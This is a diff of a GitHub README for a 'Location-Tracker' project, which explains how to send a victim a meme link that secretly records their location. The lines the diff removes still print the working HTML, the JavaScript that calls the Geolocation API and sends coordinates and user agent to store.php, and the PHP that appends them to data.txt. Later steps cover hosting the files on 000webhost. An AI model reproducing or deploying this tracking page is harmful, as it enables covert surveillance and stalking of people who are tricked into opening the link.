@@ -1,6 +1,6 @@
 # Location-Tracker
 
-This Method is used to Get the Location of the person exactly By using simple Html code.
+
 Step 1: Create the HTML File
 
 Open a text editor or code editor on your local machine.
@@ -10,41 +10,13 @@ Step 2: Add the Meme(random pic link) and JavaScript Code
 Inside locate.html, add an <iframe> tag to display the meme:
 Now when a user opens the link he will see that pic
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meme Page</title>
-</head>
-<body>
-    <iframe src="URL_TO_YOUR_MEME_IMAGE" frameborder="0"></iframe>
-</body>
-</html>
+![image](https://github.com/SriramRayala/Location-Tracker/assets/78687650/0a790d10-fd08-42b1-b63d-8a8fe46dfc6f)
+
 
 Add JavaScript code to collect user location, user agent, and IP address. This can be done using the navigator object and making a request to an external PHP file for data collection.
 
-<script>
-    // Function to send data to the PHP file
-    function sendData(location, userAgent, ipAddress) {
-        const xhr = new XMLHttpRequest();
-        xhr.open("GET", `store.php?location=${location}&userAgent=${userAgent}&ipAddress=${ipAddress}`, true);
-        xhr.send();
-    }
+![image](https://github.com/SriramRayala/Location-Tracker/assets/78687650/fdae6485-a19d-4cd3-ac47-83052073d011)
 
-    // Get user location using the Geolocation API
-    navigator.geolocation.getCurrentPosition((position) => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const location = `Latitude: ${latitude}, Longitude: ${longitude}`;
-        
-        // Get user agent and IP address
-        const userAgent = navigator.userAgent;
-        
-        // Send data to the PHP file
-        sendData(location, userAgent, '');
-    });
-</script>
 
 Step 3: Create the PHP File
 
@@ -52,16 +24,8 @@ Create a new file named store.php in the same directory as locate.html.
 
 In store.php, you can collect the data sent from the JavaScript and store it in a file or database. For example:
 
-<?php
-if (isset($_GET['location']) && isset($_GET['userAgent'])) {
-    $location = $_GET['location'];
-    $userAgent = $_GET['userAgent'];
-    
-    // Store the data in a file (e.g., data.txt)
-    $data = "Location: $location\nUser Agent: $userAgent\n";
-    file_put_contents('data.txt', $data, FILE_APPEND);
-}
-?>
+![image](https://github.com/SriramRayala/Location-Tracker/assets/78687650/72dab5cf-b55d-4c4b-a107-595b9e19d221)
+
 
 Step 4: Host the Files on 000webhost.com
 
